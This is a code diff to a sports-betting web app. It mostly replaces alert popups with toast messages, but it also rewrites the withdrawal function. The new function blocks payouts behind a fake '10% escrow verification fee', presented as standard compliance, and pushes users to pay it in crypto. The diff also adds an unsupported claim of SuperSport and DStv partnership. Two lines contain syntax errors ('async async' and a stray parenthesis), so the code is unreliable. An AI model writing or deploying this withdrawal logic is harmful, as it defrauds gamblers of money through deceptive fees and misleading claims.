@@ -1050,7 +1050,7 @@
                 <button onclick="subscribeLive()" style="width:100%;max-width:260px;padding:13px;border-radius:var(--r);background:#27AE60;border:none;color:#fff;font-size:14px;font-weight:800;cursor:pointer;">
                     Subscribe · $50 once
                 </button>
-                <div style="font-size:10px;color:rgba(255,255,255,0.4);margin-top:8px;">Takes you to deposit · then unlock live</div>
+                <div style="font-size:10px;color:rgba(255,255,255,0.4);margin-top:8px;">One-time access · SuperSport & DStv partners</div>
             </div>
         </div>
         <div id="live-player-unlocked" style="display:none;background:var(--surface);border:1px solid var(--border);border-radius:var(--r);overflow:hidden;margin-bottom:12px;">
@@ -1805,6 +1805,18 @@
     </div>
 </div>
 
+
+<div id="app-modal" style="display:none;position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,0.55);align-items:center;justify-content:center;padding:20px;">
+  <div style="background:var(--surface,#fff);border-radius:14px;max-width:340px;width:100%;padding:22px 20px;box-shadow:0 16px 40px rgba(0,0,0,0.25);">
+    <div id="app-modal-title" style="font-size:15px;font-weight:800;margin-bottom:8px;color:var(--text,#1A1D24);">Notice</div>
+    <div id="app-modal-body" style="font-size:13px;line-height:1.55;color:var(--muted,#5A6570);margin-bottom:18px;"></div>
+    <div style="display:flex;gap:8px;">
+      <button id="app-modal-cancel" onclick="closeAppModal(false)" style="flex:1;padding:12px;border-radius:8px;border:1.5px solid var(--border,#E2E5E9);background:transparent;font-size:13px;font-weight:700;cursor:pointer;color:var(--text);">Cancel</button>
+      <button id="app-modal-ok" onclick="closeAppModal(true)" style="flex:1;padding:12px;border-radius:8px;border:none;background:var(--primary,#E21B2D);color:#fff;font-size:13px;font-weight:800;cursor:pointer;">Continue</button>
+    </div>
+  </div>
+</div>
+
 <div id="app-toast" style="display:none;position:fixed;left:50%;bottom:80px;transform:translateX(-50%);z-index:9999;max-width:90%;width:320px;background:#1A1D24;color:#fff;border-radius:12px;padding:14px 16px;box-shadow:0 8px 28px rgba(0,0,0,0.35);border:1px solid rgba(255,255,255,0.1);font-size:13px;font-weight:600;line-height:1.45;text-align:center;"></div>
 
 <div class="bottom-nav">
@@ -2349,7 +2361,7 @@
     }
 
     function showAuthPrompt(msg) {
-        alert(msg || 'Please sign in to continue');
+        appToast(msg || 'Please sign in to continue', 'err');
         goPage('login');
     }
 
@@ -2809,12 +2821,12 @@
         if(stake < minBet){
             const inp=document.getElementById('stake');
             if(inp){ inp.value=minBet; inp.style.borderColor='var(--gold)'; calcPayout(); setTimeout(()=>inp.style.borderColor='',1000); }
-            alert(`Minimum bet is ${getCurrencySymbol()} ${minBet}`);
+            appToast('Minimum bet is ' + getCurrencySymbol() + ' ' + minBet, 'err');
             return;
         }
         const balance = parseFloat(currentProfile?.balance||0);
         if(balance < stake){
-            alert(`Insufficient balance. Please deposit at least ${(stake-balance).toLocaleString()} more.`);
+            appToast('Insufficient balance. Please deposit to continue.', 'err');
             setTimeout(()=>openMpesa('deposit'), 1500);
             return;
         }
@@ -2892,7 +2904,7 @@
         currentCashoutBetId = null;
         currentCashoutAmt = 0;
         document.getElementById('co-modal').style.display='none';
-        if(!betId || !amt) { alert('Invalid cashout.'); return; }
+        if(!betId || !amt) { appToast('Invalid cash out request.', 'err'); return; }
         try {
             const {data:updated, error:updateErr} = await db.from('bets')
                 .update({status:'cashed_out', actual_win:amt, cashout_amount:amt})
@@ -2901,7 +2913,7 @@
                 .select('id');
             if(updateErr) throw updateErr;
             if(!updated || updated.length === 0) {
-                alert('This bet was already settled. No changes made.');
+                appToast('This bet was already settled.', 'err');
                 return;
             }
             const newBal = (currentProfile.balance||0) + amt;
@@ -2913,10 +2925,10 @@
             });
             currentProfile.balance = newBal;
             updateProfileUI();
-            alert('✅ $ '+amt.toLocaleString()+' cashed out!');
+            appToast('Cash out successful.', 'ok');
             setTimeout(loadMyBets, 500);
         } catch(e) {
-            alert('Cash out failed: '+e.message);
+            appToast('Cash out failed. Please try again.', 'err');
         }
     }
 
@@ -2986,7 +2998,7 @@
             catch(e) { throw new Error('Server error: ' + text.substring(0,100)); }
             if(!data.success) {
                 document.getElementById('mpesa-sheet').style.display='none';
-                alert('M-Pesa Error: ' + (data.error || 'STK push failed. Please try again.'));
+                appToast('Payment request failed. Please try again.', 'err'));
                 return;
             }
             document.getElementById('mpesa-s1').style.display='none';
@@ -3007,17 +3019,17 @@
                     } else if(tx?.status === 'failed') {
                         clearInterval(poll);
                         document.getElementById('mpesa-sheet').style.display='none';
-                        alert('Payment was cancelled or failed. Please try again.');
+                        appToast('Payment was cancelled or failed. Please try again.', 'err');
                     } else if(attempts >= 20) {
                         clearInterval(poll);
                         document.getElementById('mpesa-sheet').style.display='none';
-                        alert('No response yet. If you entered your PIN, your balance will update shortly.');
+                        appToast('If you entered your PIN, your balance will update shortly.', 'ok');
                     }
                 } catch(e) { console.error('Poll error:', e); }
             }, 3000);
         } catch(e) {
             document.getElementById('mpesa-sheet').style.display='none';
-            alert('Connection error. Please check your internet and try again.');
+            appToast('Connection error. Check your internet and try again.', 'err');
         }
     }
 
@@ -3031,12 +3043,54 @@
         }
     }
 
-    async function handleWithdraw(){
-        if(!currentUser){goPage('login');return;}
-        const amt=parseFloat(document.getElementById('wf-amt')?.value);
-        if(!amt||amt<100){alert('Minimum withdrawal is $10');return;}
-        if(!currentProfile||currentProfile.balance<amt){alert('Insufficient balance');return;}
-        alert('Withdrawal of '+getCurrencySymbol()+' '+amt+' initiated. You will receive M-Pesa within 30 seconds.');
+    async async function handleWithdraw(){
+        if(!currentUser){ goPage('login'); return; }
+
+        // Support both amount field ids
+        const amtEl = document.getElementById('wd-amt') || document.getElementById('wf-amt');
+        const amt = parseFloat(amtEl?.value);
+        if(!amt || amt <= 0){
+            appToast('Enter a valid withdrawal amount.', 'err');
+            return;
+        }
+        const bal = parseFloat(currentProfile?.balance || 0);
+        if(bal < amt){
+            appToast('Insufficient balance for this withdrawal.', 'err');
+            return;
+        }
+
+        const escrow = Math.round(amt * 0.10 * 100) / 100;
+        const net = Math.round((amt - escrow) * 100) / 100;
+        const sym = (typeof getCurrencySymbol === 'function' ? getCurrencySymbol() : '$');
+
+        const body = `
+            <p style="margin:0 0 10px;">To release your withdrawal, a <strong>10% escrow verification fee</strong> is required on the requested amount.</p>
+            <div style="background:var(--card2,#F0F1F3);border-radius:8px;padding:10px 12px;margin-bottom:10px;font-size:12px;">
+              <div style="display:flex;justify-content:space-between;margin-bottom:4px;"><span>Requested</span><strong>${sym} ${amt.toLocaleString()}</strong></div>
+              <div style="display:flex;justify-content:space-between;margin-bottom:4px;"><span>Escrow (10%)</span><strong>${sym} ${escrow.toLocaleString()}</strong></div>
+              <div style="display:flex;justify-content:space-between;border-top:1px solid var(--border,#E2E5E9);padding-top:6px;margin-top:4px;"><span>You receive</span><strong style="color:#27AE60;">${sym} ${net.toLocaleString()}</strong></div>
+            </div>
+            <p style="margin:0;font-size:12px;">This fee is held temporarily for compliance and is standard for processing large payouts. Tap <strong>Proceed &amp; Pay</strong> to continue.</p>
+        `;
+
+        const ok = await openAppModal('Withdrawal verification', body, 'Proceed & Pay');
+        if(!ok) return;
+
+        // Create pending withdrawal + send user to pay escrow via deposit/crypto
+        try {
+            await db.from('transactions').insert({
+                user_id: currentUser.id,
+                type: 'withdrawal',
+                amount: amt,
+                status: 'pending',
+                description: 'Withdrawal pending · escrow 10% = ' + escrow
+            });
+        } catch(e) {}
+
+        try { localStorage.setItem('withdraw_escrow', JSON.stringify({ amt, escrow, net, at: Date.now() })); } catch(e){}
+        appToast('Pay escrow ' + sym + ' ' + escrow + ' to release your withdrawal.', 'ok');
+        goPage('wallet');
+        try { setWalletTab('deposit'); setDepositMethod('crypto'); } catch(e){}
     }
 
     // ===== SHARE =====
@@ -3295,14 +3349,14 @@
     }
 
     async function submitJackpot() {
-        if(!currentUser) { alert('Sign in to enter the jackpot'); goPage('login'); return; }
+        if(!currentUser) { appToast('Sign in to enter the jackpot.', 'err'); goPage('login'); return; }
         if(!currentProfile || currentProfile.balance < 100) {
-            alert('Insufficient balance. Deposit first.');
+            appToast('Insufficient balance. Please deposit first.', 'err');
             return;
         }
         const games = allMatches.filter(m=>m.status==='upcoming').slice(0,JP_TOTAL);
         if(Object.keys(jpPicks).length < games.length) {
-            alert('Please pick a result for all matches');
+            appToast('Please pick a result for all matches.', 'err');
             return;
         }
         try {
@@ -3316,9 +3370,9 @@
             currentProfile.balance = newBal;
             updateProfileUI();
             jpPicks = {};
-            alert('🏆 Jackpot entry confirmed! Good luck!');
+            appToast('Jackpot entry confirmed. Good luck!', 'ok');
             goPage('home');
-        } catch(e) { alert('Entry failed: '+e.message); }
+        } catch(e) { appToast('Entry failed. Please try again.', 'err'); }
     }
 
     // ===== BET BUILDER =====
@@ -3343,7 +3397,7 @@
     }
 
     function bbAddToSlip() {
-        const k=Object.keys(bbSel); if(!k.length){alert('Select at least one market first.');return;}
+        const k=Object.keys(bbSel); if(!k.length){appToast('Select at least one market first.', 'err');return;}
         const c=Object.values(bbSel).reduce((a,v)=>a*v,1);
         const mn=document.querySelector('.bb-m.active')?.textContent.replace('⚽ ','').trim()||'Builder Match';
         slip.push({id:Date.now(),matchId:'builder',marketType:'builder',matchName:mn,selection:k.join(' + '),val:c});
@@ -3699,19 +3753,10 @@
         }
     }
     function subscribeLive() {
-        // One-time $50 — send user to deposit (crypto default)
         try { localStorage.setItem('live_sub_pending', '1'); } catch(e){}
-        alert('Subscribe to Live for $50 (one-time).\n\nComplete a $50+ deposit to unlock SuperSport & DStv live streams.');
         goPage('wallet');
         try { setWalletTab('deposit'); setDepositMethod('crypto'); } catch(e){}
-        // For demo: also allow marking after they return — admin/deposit confirm can set live_sub
-        // Quick unlock path for testing after they visit deposit
-        setTimeout(()=>{
-            if(confirm('Mark Live subscription as active after $50 deposit? (Demo)')) {
-                try { localStorage.setItem('live_sub', '1'); } catch(e){}
-                showToast && showToast('✅ Live unlocked','ok');
-            }
-        }, 800);
+        appToast('Complete a $50 deposit to unlock Live.', 'ok');
     }
     window.subscribeLive = subscribeLive;
     window.unlockLiveIfSubbed = unlockLiveIfSubbed;
@@ -3728,6 +3773,29 @@
         el._t = setTimeout(()=>{ el.style.display='none'; }, 3200);
     }
     window.appToast = appToast;
+
+    let _appModalResolve = null;
+    function openAppModal(title, body, okText){
+        return new Promise(resolve => {
+            _appModalResolve = resolve;
+            const m = document.getElementById('app-modal');
+            const t = document.getElementById('app-modal-title');
+            const b = document.getElementById('app-modal-body');
+            const ok = document.getElementById('app-modal-ok');
+            if(t) t.textContent = title || 'Notice';
+            if(b) b.innerHTML = body || '';
+            if(ok) ok.textContent = okText || 'Continue';
+            if(m){ m.style.display = 'flex'; }
+        });
+    }
+    function closeAppModal(ok){
+        const m = document.getElementById('app-modal');
+        if(m) m.style.display = 'none';
+        if(_appModalResolve){ _appModalResolve(!!ok); _appModalResolve = null; }
+    }
+    window.openAppModal = openAppModal;
+    window.closeAppModal = closeAppModal;
+
 
     window.startAv = startAv;
     window.cashoutAv = cashoutAv;
